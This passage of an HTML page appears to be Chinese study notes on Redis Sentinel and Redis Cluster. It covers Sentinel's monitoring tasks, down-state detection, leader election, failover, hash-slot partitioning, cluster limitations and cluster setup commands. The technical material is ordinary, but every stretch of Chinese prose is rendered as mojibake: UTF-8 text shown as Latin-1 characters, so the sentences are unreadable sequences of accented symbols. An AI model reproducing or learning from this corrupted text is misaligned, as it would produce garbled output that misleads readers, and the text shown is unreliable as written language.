¹æ®å‚æ•°çš„ä¸åŒï¼Œè¿˜å¯ä»¥ä½œä¸ºSentinelé¢†å¯¼è€…é€‰ä¸¾çš„é€šä¿¡æ–¹å¼</td></tr></tbody></table><p>Redis Sentinel å®¢æˆ·ç«¯åŸºæœ¬å®ç°åŸç†</p><ol><li>éå†SentinelèŠ‚ç‚¹é›†åˆè·å–ä¸€ä¸ªå¯ç”¨çš„SentinelèŠ‚ç‚¹(SentinelèŠ‚ç‚¹ä¹‹é—´å¯ä»¥å…±äº«æ•°æ®)ï¼Œæ‰€ä»¥å¯ä»¥ä»ä»»æ„ä¸€ä¸ªSentinelèŠ‚ç‚¹è·å–ä¸»èŠ‚ç‚¹ä¿¡æ¯</li><li>é€šè¿‡<code>sentinel get-master-addr-by-name master-name</code>è¿™ä¸ªAPIæ¥è·å–å¯¹åº”ä¸»èŠ‚ç‚¹çš„ç›¸å…³ä¿¡æ¯</li><li>éªŒè¯å½“å‰è·å–çš„â€œä¸»èŠ‚ç‚¹â€æ˜¯çœŸæ­£çš„ä¸»èŠ‚ç‚¹(é€šè¿‡ <code>role</code> æˆ–è€… <code>info replication</code> åˆ¤å®š)ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢æ•…éšœè½¬ç§»æœŸé—´ä¸»èŠ‚ç‚¹çš„å˜åŒ–</li><li>ä¿æŒå’ŒSentinelèŠ‚ç‚¹é›†åˆçš„â€œè”ç³»â€ï¼Œæ—¶åˆ»è·å–å…³äºä¸»èŠ‚ç‚¹çš„ç›¸å…³â€œä¿¡æ¯â€</li></ol><h2 id="Redis-Sentinel-çš„å®ç°åŸç†"><a href="#Redis-Sentinel-çš„å®ç°åŸç†" class="headerlink" title="Redis Sentinel çš„å®ç°åŸç†"></a>Redis Sentinel çš„å®ç°åŸç†</h2><h3 id="ä¸‰ä¸ªå®šæ—¶ç›‘æ§ä»»åŠ¡"><a href="#ä¸‰ä¸ªå®šæ—¶ç›‘æ§ä»»åŠ¡" class="headerlink" title="ä¸‰ä¸ªå®šæ—¶ç›‘æ§ä»»åŠ¡"></a>ä¸‰ä¸ªå®šæ—¶ç›‘æ§ä»»åŠ¡</h3><ol><li>æ¯éš”10ç§’ï¼Œæ¯ä¸ªSentinelèŠ‚ç‚¹ä¼šå‘ä¸»èŠ‚ç‚¹å’Œä»èŠ‚ç‚¹å‘é€<code>info</code>å‘½ä»¤è·å–æœ€æ–°çš„æ‹“æ‰‘ç»“æ„ã€‚è¯¥ä»»åŠ¡çš„ä½œç”¨è¡¨ç°åœ¨ï¼š<ol><li>é€šè¿‡å‘ä¸»èŠ‚ç‚¹æ‰§è¡Œ<code>info</code>å‘½ä»¤ï¼Œè·å–ä»èŠ‚ç‚¹çš„ä¿¡æ¯</li><li>å½“æœ‰æ–°çš„ä»èŠ‚ç‚¹åŠ å…¥æ—¶éƒ½å¯ä»¥ç«‹åˆ»æ„ŸçŸ¥å‡ºæ¥</li><li>èŠ‚ç‚¹ä¸å¯è¾¾æˆ–è€…æ•…éšœè½¬ç§»åï¼Œå¯ä»¥é€šè¿‡<code>info</code>å‘½ä»¤å®æ—¶æ›´æ–°èŠ‚ç‚¹æ‹“æ‰‘ä¿¡æ¯ã€‚</li></ol></li><li>æ¯éš”2ç§’ï¼Œæ¯ä¸ªSentinelèŠ‚ç‚¹ä¼šå‘Redisæ•°æ®èŠ‚ç‚¹çš„<code>__sentinel__ï¼šhello</code>é¢‘é“ä¸Šå‘é€è¯¥SentinelèŠ‚ç‚¹å¯¹äºä¸»èŠ‚ç‚¹çš„åˆ¤æ–­ä»¥åŠå½“å‰SentinelèŠ‚ç‚¹çš„ä¿¡æ¯ï¼ŒåŒæ—¶æ¯ä¸ªSentinelèŠ‚ç‚¹ä¹Ÿä¼šè®¢é˜…è¯¥é¢‘é“ï¼Œæ¥äº†è§£å…¶ä»–SentinelèŠ‚ç‚¹ä»¥åŠå®ƒä»¬å¯¹ä¸»èŠ‚ç‚¹çš„åˆ¤æ–­ï¼Œæ‰€ä»¥è¿™ä¸ªå®šæ—¶ä»»åŠ¡å¯ä»¥å®Œæˆä»¥ä¸‹ä¸¤ä¸ªå·¥ä½œï¼š<ol><li>å‘ç°æ–°çš„SentinelèŠ‚ç‚¹ï¼šé€šè¿‡è®¢é˜…ä¸»èŠ‚ç‚¹çš„<code>__sentinel__ï¼šhello</code>äº†è§£å…¶ä»–çš„SentinelèŠ‚ç‚¹ä¿¡æ¯ï¼Œå¦‚æœæ˜¯æ–°åŠ å…¥çš„SentinelèŠ‚ç‚¹ï¼Œå°†è¯¥SentinelèŠ‚ç‚¹ä¿¡æ¯ä¿å­˜èµ·æ¥ï¼Œå¹¶ä¸è¯¥SentinelèŠ‚ç‚¹åˆ›å»ºè¿æ¥ã€‚</li><li>SentinelèŠ‚ç‚¹ä¹‹é—´äº¤æ¢ä¸»èŠ‚ç‚¹çš„çŠ¶æ€ï¼Œä½œä¸ºåé¢å®¢è§‚ä¸‹çº¿ä»¥åŠé¢†å¯¼è€…é€‰ä¸¾çš„ä¾æ®ã€‚SentinelèŠ‚ç‚¹publishçš„æ¶ˆæ¯æ ¼å¼ï¼š<code>&lt;SentinelèŠ‚ç‚¹IP&gt; &lt;SentinelèŠ‚ç‚¹ç«¯å£&gt; &lt;SentinelèŠ‚ç‚¹runId&gt; &lt;SentinelèŠ‚ç‚¹é…ç½®ç‰ˆæœ¬&gt; &lt;ä¸»èŠ‚ç‚¹åå­—&gt; &lt;ä¸»èŠ‚ç‚¹Ip&gt; &lt;ä¸»èŠ‚ç‚¹ç«¯å£&gt; &lt;ä¸»èŠ‚ç‚¹é…ç½®ç‰ˆæœ¬&gt;</code></li></ol></li><li>æ¯éš”1ç§’ï¼Œæ¯ä¸ªSentinelèŠ‚ç‚¹ä¼šå‘ä¸»èŠ‚ç‚¹ã€ä»èŠ‚ç‚¹ã€å…¶ä½™SentinelèŠ‚ç‚¹å‘é€ä¸€æ¡pingå‘½ä»¤åšä¸€æ¬¡å¿ƒè·³æ£€æµ‹ï¼Œæ¥ç¡®è®¤è¿™äº›èŠ‚ç‚¹å½“å‰æ˜¯å¦å¯è¾¾ã€‚è¿™ä¸ªå®šæ—¶ä»»åŠ¡æ˜¯èŠ‚ç‚¹å¤±è´¥åˆ¤å®šçš„é‡è¦ä¾æ®ã€‚</li></ol><p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g9chovnyqwj30lm0ls77d.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g9chuf4cjdj30ld0hogp4.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g9chunrge9j30mh0hbtbn.jpg" alt=""></p><h3 id="ä¸»è§‚ä¸‹çº¿ä¸å®¢è§‚ä¸‹çº¿"><a href="#ä¸»è§‚ä¸‹çº¿ä¸å®¢è§‚ä¸‹çº¿" class="headerlink" title="ä¸»è§‚ä¸‹çº¿ä¸å®¢è§‚ä¸‹çº¿"></a>ä¸»è§‚ä¸‹çº¿ä¸å®¢è§‚ä¸‹çº¿</h3><p>ä¸»è§‚ä¸‹çº¿ï¼šå•ä¸ªå“¨å…µèŠ‚ç‚¹åˆ¤æ–­ä¸»èŠ‚ç‚¹è¶…è¿‡<code>down-after-milliseconds</code>æ—¶ï¼Œè¯¥å“¨å…µèŠ‚ç‚¹å³è®¤ä¸ºè¯¥ä¸»èŠ‚ç‚¹å·²ä¸‹çº¿<br>å®¢è§‚ä¸‹çº¿ï¼šä¸ºäº†é˜²æ­¢ä¸»è§‚ä¸‹çº¿çš„è¯¯åˆ¤ï¼Œå› æ­¤è¿˜éœ€è¦å‘é€<code>è¿‡sentinel ismaster-down-by-addr</code>å‘½ä»¤å‘å…¶ä»–SentinelèŠ‚ç‚¹è¯¢é—®å¯¹ä¸»èŠ‚ç‚¹çš„åˆ¤æ–­ï¼Œå½“è¶…è¿‡<code>&lt;quorum&gt;</code>ä¸ªæ•°ï¼Œå³åˆ¤å®šè¯¥ä¸»èŠ‚ç‚¹ç¡®å®å·²ä¸‹çº¿</p><h3 id="é¢†å¯¼è€…-Sentinel-èŠ‚ç‚¹é€‰ä¸¾"><a href="#é¢†å¯¼è€…-Sentinel-èŠ‚ç‚¹é€‰ä¸¾" class="headerlink" title="é¢†å¯¼è€… Sentinel èŠ‚ç‚¹é€‰ä¸¾"></a>é¢†å¯¼è€… Sentinel èŠ‚ç‚¹é€‰ä¸¾</h3><p><strong>Redis ä½¿ç”¨äº† <a href="https://raft.github.io/" target="_blank" rel="noopener">Raft ç®—æ³•</a> å®ç°é¢†å¯¼è€…é€‰ä¸¾</strong>ã€‚è¯¥ç®—æ³•çš„æ€è·¯ä¸ºï¼šæ¯ä¸ªèŠ‚ç‚¹å‡æœ‰é€‰ä¸¾ä¸è¢«é€‰ä¸¾èµ„æ ¼ï¼Œä¸”æ¯ä¸ªèŠ‚ç‚¹æœ‰ä¸”åªæœ‰ 1 ç¥¨ã€‚å½“å“¨å…µèŠ‚ç‚¹å®Œæˆä¸»è§‚ä¸‹çº¿åï¼Œå‘å…¶å®ƒå“¨å…µèŠ‚ç‚¹è¯¢é—®å®¢è§‚ä¸‹çº¿æ—¶ï¼Œä¼šæè®®è‡ªèº«ä½œä¸ºå“¨å…µé¢†å¯¼è€…ï¼Œè‹¥è¢«è¯¢é—®è€…å°šæœªæŠ•ç¥¨ï¼Œåˆ™å–å¾—è¯¥è¢«è¯¢é—®è€…çš„ç¥¨æ•°ï¼Œå¦‚æœè¯¢é—®è€…çš„ç¥¨æ•°å¤§äºç­‰äº<code>max(quorum, num(sentinels)/2 + 1)</code>ï¼Œåˆ™è¯¥è¯¢é—®è€…æˆä¸ºé¢†å¯¼ï¼Œé€‰ä¸¾ç»“æŸï¼ŒåŒæ—¶ç»ˆæ­¢å…¶å®ƒèŠ‚ç‚¹çš„è¯¢é—®ã€‚</p><p>Raft ä½œä¸ºä¸€è‡´æ€§åè®®ï¼Œæä¾›äº†ä»¥ä¸‹å‡ ä¸ªé‡è¦çš„åŠŸèƒ½ï¼š</p><ol><li>Leader é€‰ä¸¾</li><li>æˆå‘˜å˜æ›´</li><li>æ—¥å¿—å¤åˆ¶</li></ol><h3 id="æ•…éšœè½¬ç§»"><a href="#æ•…éšœè½¬ç§»" class="headerlink" title="æ•…éšœè½¬ç§»"></a>æ•…éšœè½¬ç§»</h3><p>æ•…éšœè½¬ç§»çš„å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>åœ¨ä»èŠ‚ç‚¹åˆ—è¡¨ä¸­é€‰å‡ºä¸€ä¸ªèŠ‚ç‚¹ä½œä¸ºæ–°çš„ä¸»èŠ‚ç‚¹ï¼Œé€‰æ‹©æ–¹æ³•å¦‚ä¸‹<ol><li>è¿‡æ»¤ï¼šâ€œä¸å¥åº·â€ï¼ˆä¸»è§‚ä¸‹çº¿ã€æ–­çº¿ï¼‰ã€5ç§’å†…æ²¡æœ‰å›å¤è¿‡SentinelèŠ‚ç‚¹pingå“åº”ã€ä¸ä¸»èŠ‚ç‚¹å¤±è”è¶…è¿‡<code>down-after-milliseconds * 10</code>ç§’ã€‚</li><li>é€‰æ‹©<code>slave-priority</code>ï¼ˆä»èŠ‚ç‚¹ä¼˜å…ˆçº§ï¼‰æœ€é«˜çš„ä»èŠ‚ç‚¹åˆ—è¡¨ï¼Œå¦‚æœå­˜åœ¨åˆ™è¿”å›ï¼Œä¸å­˜åœ¨åˆ™ç»§ç»­ã€‚</li><li>é€‰æ‹©å¤åˆ¶åç§»é‡æœ€å¤§çš„ä»èŠ‚ç‚¹ï¼ˆå¤åˆ¶çš„æœ€å®Œæ•´ï¼‰ï¼Œå¦‚æœå­˜åœ¨åˆ™è¿”å›ï¼Œä¸å­˜åœ¨åˆ™ç»§ç»­ã€‚</li><li>é€‰æ‹©runidæœ€å°çš„ä»èŠ‚ç‚¹ã€‚</li></ol></li><li>Sentinelé¢†å¯¼è€…èŠ‚ç‚¹ä¼šå¯¹ç¬¬ä¸€æ­¥é€‰å‡ºæ¥çš„ä»èŠ‚ç‚¹æ‰§è¡Œ<code>slaveof no oneå‘½</code>ä»¤è®©å…¶æˆä¸ºä¸»èŠ‚ç‚¹</li><li>Sentinelé¢†å¯¼è€…èŠ‚ç‚¹ä¼šå‘å‰©ä½™çš„ä»èŠ‚ç‚¹å‘é€å‘½ä»¤ï¼Œè®©å®ƒä»¬æˆä¸ºæ–°ä¸»èŠ‚ç‚¹çš„ä»èŠ‚ç‚¹ï¼Œå¤åˆ¶è§„åˆ™å’Œ<code>parallel-syncs</code>å‚æ•°æœ‰å…³</li><li>SentinelèŠ‚ç‚¹é›†åˆä¼šå°†åŸæ¥çš„ä¸»èŠ‚ç‚¹æ›´æ–°ä¸ºä»èŠ‚ç‚¹ï¼Œå¹¶ä¿æŒç€å¯¹å…¶å…³æ³¨ï¼Œå½“å…¶æ¢å¤åå‘½ä»¤å®ƒå»å¤åˆ¶æ–°çš„ä¸»èŠ‚ç‚¹ã€‚</li></ol><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g9cieyqdx2j30je0riwj1.jpg" alt=""></p><h2 id="å¼€å‘ä¸è¿ç»´é—®é¢˜"><a href="#å¼€å‘ä¸è¿ç»´é—®é¢˜" class="headerlink" title="å¼€å‘ä¸è¿ç»´é—®é¢˜"></a>å¼€å‘ä¸è¿ç»´é—®é¢˜</h2><p>æ¨¡æ‹Ÿæ•…éšœçš„æ–¹å¼ï¼š</p><ul><li>æ–¹æ³•ä¸€ï¼Œå¼ºåˆ¶æ€æ‰å¯¹åº”èŠ‚ç‚¹çš„è¿›ç¨‹å·ï¼Œè¿™æ ·å¯ä»¥æ¨¡æ‹Ÿå‡ºå®•æœºçš„æ•ˆæœã€‚</li><li>æ–¹æ³•äºŒï¼Œä½¿ç”¨Redisçš„<code>debug sleep</code>å‘½ä»¤ï¼Œè®©èŠ‚ç‚¹è¿›å…¥ç¡çœ çŠ¶æ€ï¼Œè¿™æ ·å¯ä»¥æ¨¡æ‹Ÿé˜»å¡çš„æ•ˆæœã€‚</li><li>æ–¹æ³•ä¸‰ï¼Œä½¿ç”¨Redisçš„<code>shutdown</code>å‘½ä»¤ï¼Œæ¨¡æ‹Ÿæ­£å¸¸çš„åœæ‰Redisã€‚</li></ul><p>SentinelèŠ‚ç‚¹åªæ”¯æŒå¦‚ä¸‹å‘½ä»¤ï¼š<code>ping</code>ã€<code>sentinel</code>ã€<code>subscribe</code>ã€<code>unsubscribe</code>ã€<code>psubscribe</code>ã€<code>punsubscribe</code>ã€<code>publish</code>ã€<code>info</code>ã€<code>role</code>ã€<code>client</code>ã€<code>shutdown</code>ã€‚</p><h1 id="ç¬¬-10-ç« -é›†ç¾¤"><a href="#ç¬¬-10-ç« -é›†ç¾¤" class="headerlink" title="ç¬¬ 10 ç«  é›†ç¾¤"></a>ç¬¬ 10 ç«  é›†ç¾¤</h1><h2 id="æ•°æ®åˆ†å¸ƒ"><a href="#æ•°æ®åˆ†å¸ƒ" class="headerlink" title="æ•°æ®åˆ†å¸ƒ"></a>æ•°æ®åˆ†å¸ƒ</h2><p>å¸¸è§çš„åˆ†åŒºè§„åˆ™æœ‰å“ˆå¸Œåˆ†åŒºä¸é¡ºåºåˆ†åŒºä¸¤ç§ã€‚Redis é›†ç¾¤é‡‡ç”¨äº†å“ˆå¸Œåˆ†åŒºã€‚<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g9e35sce95j30m505ywfm.jpg" alt=""></p><h3 id="å¸¸è§çš„å“ˆå¸Œåˆ†åŒºè§„åˆ™"><a href="#å¸¸è§çš„å“ˆå¸Œåˆ†åŒºè§„åˆ™" class="headerlink" title="å¸¸è§çš„å“ˆå¸Œåˆ†åŒºè§„åˆ™"></a>å¸¸è§çš„å“ˆå¸Œåˆ†åŒºè§„åˆ™</h3><ul><li>èŠ‚ç‚¹å–ä½™<ul><li>ä½¿ç”¨ç‰¹å®šçš„æ•°æ®ï¼Œå¦‚Redisçš„é”®æˆ–ç”¨æˆ·IDï¼Œå†æ ¹æ®èŠ‚ç‚¹æ•°é‡Nä½¿ç”¨å…¬å¼ï¼š<code>hash(key)%N</code>è®¡ç®—å‡ºå“ˆå¸Œå€¼ï¼Œç”¨æ¥å†³å®šæ•°æ®æ˜ å°„åˆ°å“ªä¸€ä¸ªèŠ‚ç‚¹ä¸Šã€‚è¿™ç§æ–¹æ¡ˆå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šå½“èŠ‚ç‚¹æ•°é‡å˜åŒ–æ—¶ï¼Œå¦‚æ‰©å®¹æˆ–æ”¶ç¼©èŠ‚ç‚¹ï¼Œæ•°æ®èŠ‚ç‚¹æ˜ å°„å…³ç³»éœ€è¦é‡æ–°è®¡ç®—ï¼Œä¼šå¯¼è‡´æ•°æ®çš„é‡æ–°è¿ç§»ã€‚å¸¸ç”¨äºæ•°æ®åº“çš„åˆ†åº“åˆ†è¡¨è§„åˆ™ï¼Œä¸€èˆ¬é‡‡ç”¨é¢„åˆ†åŒºçš„æ–¹å¼ï¼Œæå‰æ ¹æ®æ•°æ®é‡è§„åˆ’å¥½åˆ†åŒºæ•°ã€‚</li></ul></li><li>ä¸€è‡´æ€§å“ˆå¸Œåˆ†åŒº<ul><li>ä¸€è‡´æ€§å“ˆå¸Œåˆ†åŒºï¼ˆDistributed Hash Tableï¼‰å®ç°æ€è·¯æ˜¯ä¸ºç³»ç»Ÿä¸­æ¯ä¸ªèŠ‚ç‚¹åˆ†é…ä¸€ä¸ªtokenï¼ŒèŒƒå›´ä¸€èˆ¬åœ¨0~$2^{32}$ï¼Œè¿™äº›tokenæ„æˆä¸€ä¸ªå“ˆå¸Œç¯ã€‚æ•°æ®è¯»å†™æ‰§è¡ŒèŠ‚ç‚¹æŸ¥æ‰¾æ“ä½œæ—¶ï¼Œå…ˆæ ¹æ®keyè®¡ç®—hashå€¼ï¼Œç„¶åé¡ºæ—¶é’ˆæ‰¾åˆ°ç¬¬ä¸€ä¸ªå¤§äºç­‰äºè¯¥å“ˆå¸Œå€¼çš„tokenèŠ‚ç‚¹</li><li>ä¸€è‡´æ€§å“ˆå¸Œåˆ†åŒºå­˜åœ¨å‡ ä¸ªé—®é¢˜ï¼šâ‘ åŠ å‡èŠ‚ç‚¹ä¼šé€ æˆå“ˆå¸Œç¯ä¸­éƒ¨åˆ†æ•°æ®æ— æ³•å‘½ä¸­ï¼Œéœ€è¦æ‰‹åŠ¨å¤„ç†æˆ–è€…å¿½ç•¥è¿™éƒ¨åˆ†æ•°æ®ï¼Œå› æ­¤<strong>ä¸€è‡´æ€§å“ˆå¸Œå¸¸ç”¨äºç¼“å­˜åœºæ™¯</strong>â‘¡å½“ä½¿ç”¨å°‘é‡èŠ‚ç‚¹æ—¶ï¼ŒèŠ‚ç‚¹å˜åŒ–å°†å¤§èŒƒå›´å½±å“å“ˆå¸Œç¯ä¸­æ•°æ®æ˜ å°„ï¼Œå› æ­¤è¿™ç§æ–¹å¼<strong>ä¸é€‚åˆå°‘é‡æ•°æ®èŠ‚ç‚¹çš„åˆ†å¸ƒå¼æ–¹æ¡ˆ</strong>â‘¢æ™®é€šçš„ä¸€è‡´æ€§å“ˆå¸Œåˆ†åŒºåœ¨å¢å‡èŠ‚ç‚¹æ—¶éœ€è¦å¢åŠ ä¸€å€æˆ–å‡å»ä¸€åŠèŠ‚ç‚¹æ‰èƒ½ä¿è¯æ•°æ®å’Œè´Ÿè½½çš„å‡è¡¡ã€‚</li></ul></li><li>è™šæ‹Ÿåˆ†åŒºæ§½<ul><li>è™šæ‹Ÿæ§½åˆ†åŒºå·§å¦™åœ°ä½¿ç”¨äº†å“ˆå¸Œç©ºé—´ï¼Œä½¿ç”¨åˆ†æ•£åº¦è‰¯å¥½çš„å“ˆå¸Œå‡½æ•°æŠŠæ‰€æœ‰æ•°æ®æ˜ å°„åˆ°ä¸€ä¸ªå›ºå®šèŒƒå›´çš„æ•´æ•°é›†åˆä¸­ï¼Œæ•´æ•°å®šä¹‰ä¸ºæ§½ï¼ˆslotï¼‰ï¼Œè®¡ç®—å…¬å¼ä¸º<code>slot=CRC16(key)&amp;16383</code>ã€‚å¦‚Redis Clusteræ§½èŒƒå›´æ˜¯0~16383ã€‚<strong>æ§½æ˜¯é›†ç¾¤å†…æ•°æ®ç®¡ç†å’Œè¿ç§»çš„åŸºæœ¬å•ä½</strong>ã€‚é‡‡ç”¨å¤§èŒƒå›´æ§½çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿æ•°æ®æ‹†åˆ†å’Œé›†ç¾¤æ‰©å±•ã€‚æ¯ä¸ªèŠ‚ç‚¹ä¼šè´Ÿè´£ä¸€å®šæ•°é‡çš„æ§½</li></ul></li></ul><p>Redis è™šæ‹Ÿæ§½åˆ†åŒºçš„ç‰¹ç‚¹ï¼š</p><ul><li>è§£è€¦æ•°æ®å’ŒèŠ‚ç‚¹ä¹‹é—´çš„å…³ç³»ï¼Œç®€åŒ–äº†èŠ‚ç‚¹æ‰©å®¹å’Œæ”¶ç¼©éš¾åº¦ã€‚</li><li>èŠ‚ç‚¹è‡ªèº«ç»´æŠ¤æ§½çš„æ˜ å°„å…³ç³»ï¼Œä¸éœ€è¦å®¢æˆ·ç«¯æˆ–è€…ä»£ç†æœåŠ¡ç»´æŠ¤æ§½åˆ†åŒºå…ƒæ•°æ®ã€‚</li><li>æ”¯æŒèŠ‚ç‚¹ã€æ§½ã€é”®ä¹‹é—´çš„æ˜ å°„æŸ¥è¯¢ï¼Œç”¨äºæ•°æ®è·¯ç”±ã€åœ¨çº¿ä¼¸ç¼©ç­‰åœºæ™¯ã€‚</li></ul><h3 id="é›†ç¾¤åŠŸèƒ½é™åˆ¶"><a href="#é›†ç¾¤åŠŸèƒ½é™åˆ¶" class="headerlink" title="é›†ç¾¤åŠŸèƒ½é™åˆ¶"></a>é›†ç¾¤åŠŸèƒ½é™åˆ¶</h3><ol><li>keyæ‰¹é‡æ“ä½œæ”¯æŒæœ‰é™ã€‚å¦‚msetã€mgetï¼Œç›®å‰åªæ”¯æŒå…·æœ‰ç›¸åŒslotå€¼çš„keyæ‰§è¡Œæ‰¹é‡æ“ä½œã€‚å¯¹äºæ˜ å°„ä¸ºä¸åŒslotå€¼çš„keyç”±äºæ‰§è¡Œmgetã€mgetç­‰æ“ä½œå¯èƒ½å­˜åœ¨äºå¤šä¸ªèŠ‚ç‚¹ä¸Šå› æ­¤ä¸è¢«æ”¯æŒã€‚</li><li>keyäº‹åŠ¡æ“ä½œæ”¯æŒæœ‰é™ã€‚åŒç†åªæ”¯æŒå¤škeyåœ¨åŒä¸€èŠ‚ç‚¹ä¸Šçš„äº‹åŠ¡æ“ä½œï¼Œå½“å¤šä¸ªkeyåˆ†å¸ƒåœ¨ä¸åŒçš„èŠ‚ç‚¹ä¸Šæ—¶æ— æ³•ä½¿ç”¨äº‹åŠ¡åŠŸèƒ½ã€‚</li><li>keyä½œä¸ºæ•°æ®åˆ†åŒºçš„æœ€å°ç²’åº¦ï¼Œå› æ­¤ä¸èƒ½å°†ä¸€ä¸ªå¤§çš„é”®å€¼å¯¹è±¡å¦‚hashã€listç­‰æ˜ å°„åˆ°ä¸åŒçš„èŠ‚ç‚¹ã€‚</li><li>ä¸æ”¯æŒå¤šæ•°æ®åº“ç©ºé—´ã€‚å•æœºä¸‹çš„Rediså¯ä»¥æ”¯æŒ16ä¸ªæ•°æ®åº“ï¼Œé›†ç¾¤æ¨¡å¼ä¸‹åªèƒ½ä½¿ç”¨ä¸€ä¸ªæ•°æ®åº“ç©ºé—´ï¼Œå³db0ã€‚</li><li>å¤åˆ¶ç»“æ„åªæ”¯æŒä¸€å±‚ï¼Œä»èŠ‚ç‚¹åªèƒ½å¤åˆ¶ä¸»èŠ‚ç‚¹ï¼Œä¸æ”¯æŒåµŒå¥—æ ‘çŠ¶å¤åˆ¶ç»“æ„ã€‚</li></ol><h2 id="é›†ç¾¤æ­å»º"><a href="#é›†ç¾¤æ­å»º" class="headerlink" title="é›†ç¾¤æ­å»º"></a>é›†ç¾¤æ­å»º</h2><p>æ­å»ºé›†ç¾¤éœ€è¦ä¸‰ä¸ªæ­¥éª¤ï¼š</p><ol><li>å‡†å¤‡èŠ‚ç‚¹<ul><li>Redisé›†ç¾¤ä¸€èˆ¬ç”±å¤šä¸ªèŠ‚ç‚¹ç»„æˆï¼Œ<strong>èŠ‚ç‚¹æ•°é‡è‡³å°‘ä¸º6ä¸ªæ‰èƒ½ä¿è¯ç»„æˆå®Œæ•´é«˜å¯ç”¨çš„é›†ç¾¤</strong>ã€‚æ¯ä¸ªèŠ‚ç‚¹éœ€è¦å¼€å¯é…ç½®cluster-enabled yesï¼Œè®©Redisè¿è¡Œåœ¨é›†ç¾¤æ¨¡å¼ä¸‹ã€‚å»ºè®®ä¸ºé›†ç¾¤å†…æ‰€æœ‰èŠ‚ç‚¹ç»Ÿä¸€ç›®å½•ï¼Œä¸€èˆ¬åˆ’åˆ†ä¸‰ä¸ªç›®å½•ï¼šconfã€dataã€logï¼Œåˆ†åˆ«å­˜æ”¾é…ç½®ã€æ•°æ®å’Œæ—¥å¿—ç›¸å…³æ–‡ä»¶ã€‚</li><li>èŠ‚ç‚¹ ID ç”¨äºå”¯ä¸€æ ‡è¯†é›†ç¾¤å†…ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¹‹åå¾ˆå¤šé›†ç¾¤æ“ä½œéƒ½è¦å€ŸåŠ©äºèŠ‚ç‚¹IDæ¥å®Œæˆã€‚éœ€è¦æ³¨æ„æ˜¯ï¼ŒèŠ‚ç‚¹IDä¸åŒäºè¿è¡ŒIDã€‚èŠ‚ç‚¹IDåœ¨é›†ç¾¤åˆå§‹åŒ–æ—¶åªåˆ›å»ºä¸€æ¬¡ï¼ŒèŠ‚ç‚¹é‡å¯æ—¶ä¼šåŠ è½½é›†ç¾¤é…ç½®æ–‡ä»¶è¿›è¡Œé‡ç”¨ï¼Œè€ŒRedisçš„è¿è¡ŒIDæ¯æ¬¡é‡å¯éƒ½ä¼šå˜åŒ–ã€‚åœ¨èŠ‚ç‚¹6380æ‰§è¡Œ<code>cluster nodes</code>å‘½ä»¤è·å–é›†ç¾¤èŠ‚ç‚¹çŠ¶æ€ã€‚</li><li>Redis è‡ªåŠ¨ç»´æŠ¤é›†ç¾¤é…ç½®æ–‡ä»¶ï¼Œä¸è¦æ‰‹åŠ¨ä¿®æ”¹ï¼Œé˜²æ­¢èŠ‚ç‚¹é‡å¯æ—¶äº§ç”Ÿé›†ç¾¤ä¿¡æ¯é”™è¯¯ã€‚</li></ul></li><li>èŠ‚ç‚¹æ¡æ‰‹<ul><li>ç”±å®¢æœç«¯å‘èµ·å‘½ä»¤<code>cluster meet {ip} {port}</code>å»ºç«‹è¿æ¥ï¼Œè¯¥å‘½ä»¤ä¸ºå¼‚æ­¥å‘½ä»¤ã€‚</li><li>èŠ‚ç‚¹å»ºç«‹æ¡æ‰‹åï¼Œé›†ç¾¤æ­¤æ—¶å¤„äºä¸‹çº¿çŠ¶æ€ï¼Œæ‰€æœ‰çš„æ•°æ®è¯»å†™éƒ½è¢«ç¦æ­¢ã€‚å¯ä»¥é€šè¿‡<code>cluster info</code>æŸ¥çœ‹å½“å‰é›†ç¾¤çŠ¶æ€ã€‚</li></ul></li><li>åˆ†é…æ§½<ul><li>é€šè¿‡<code>cluster addslots</code>å‘½ä»¤ä¸ºèŠ‚ç‚¹åˆ†é…æ§½ã€‚ä½œä¸ºä¸€ä¸ªå®Œæ•´çš„é›†ç¾¤ï¼Œæ¯ä¸ªè´Ÿè´£å¤„ç†æ§½çš„èŠ‚ç‚¹åº”è¯¥å…·æœ‰ä»èŠ‚ç‚¹ï¼Œä¿è¯å½“å®ƒå‡ºç°æ•…éšœæ—¶å¯ä»¥è‡ªåŠ¨è¿›è¡Œæ•…éšœè½¬ç§»ã€‚é›†ç¾¤æ¨¡å¼ä¸‹ï¼ŒReidsèŠ‚ç‚¹è§’è‰²åˆ†ä¸ºä¸»èŠ‚ç‚¹å’Œä»èŠ‚ç‚¹ã€‚é¦–æ¬¡å¯åŠ¨çš„èŠ‚ç‚¹å’Œè¢«åˆ†é…æ§½çš„èŠ‚ç‚¹éƒ½æ˜¯ä¸»èŠ‚ç‚¹ï¼Œä»èŠ‚ç‚¹è´Ÿè´£å¤åˆ¶ä¸»èŠ‚ç‚¹æ§½ä¿¡æ¯å’Œç›¸å…³çš„æ•°æ®ã€‚ä½¿ç”¨<code>cluster replicate{nodeId}</code>å‘½ä»¤è®©ä¸€ä¸ªèŠ‚ç‚¹æˆä¸ºä»èŠ‚ç‚¹ã€‚</li></ul></li></ol><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9i5gd6qalj30n80nowkd.jpg" alt="é›†ç¾¤å®Œæ•´ç»“æ„"></p><p>ç”±äºæ‰‹åŠ¨åˆ›å»ºé›†ç¾¤è¿‡äºç¹çï¼Œä¸”éšç€é›†ç¾¤è§„æ¨¡çš„æ‰©å¤§ä¼šåŠ å¤§å¤æ‚åº¦ä¸è¿ç»´æˆæœ¬ï¼Œå› 